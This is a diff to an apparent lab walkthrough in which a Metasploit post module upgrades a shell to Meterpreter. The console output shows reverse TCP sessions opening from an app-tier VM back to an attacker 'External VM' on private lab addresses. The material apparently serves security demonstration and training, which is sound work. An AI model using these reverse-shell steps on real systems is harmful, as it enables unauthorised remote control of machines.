@@ -201,13 +201,15 @@ msf5 post(multi/manage/shell_to_meterpreter) > set session 4
 session => 4
 msf5 post(multi/manage/shell_to_meterpreter) > exploit
 ```
-4. Confirm a **Meterpreter** reverse TCP session was established from **App2-APP-TIER VM** back to the **Extermal VM** and interact with the session.
+4. Confirm a **Meterpreter** reverse TCP session was established from **App2-APP-TIER VM** back to the **Extermal VM** and interact with the session. You may see 2 Meterpreter sessions get established. 
 ```console
 [*] Upgrading session ID: 4
 [*] Starting exploit/multi/handler
 [*] Started reverse TCP handler on 10.114.209.151:8082
 [*] Sending stage (980808 bytes) to 10.114.209.148
-[*] Meterpreter session 5 opened (10.114.209.151:8082 -> 10.114.209.148:55750) at 2020-07-29 09:11:14 -0500
+[*] Meterpreter session 5 opened (10.114.209.151:8082 -> 10.114.209.148:15262) at 2020-07-29 09:45:08 -0500
+[*] Sending stage (980808 bytes) to 10.114.209.148
+[*] Meterpreter session 6 opened (10.114.209.151:8082 -> 10.114.209.148:12896) at 2020-07-29 09:45:12 -0500
 [*] Command stager progress: 100.00% (773/773 bytes)
 [*] Post module execution completed
 ```
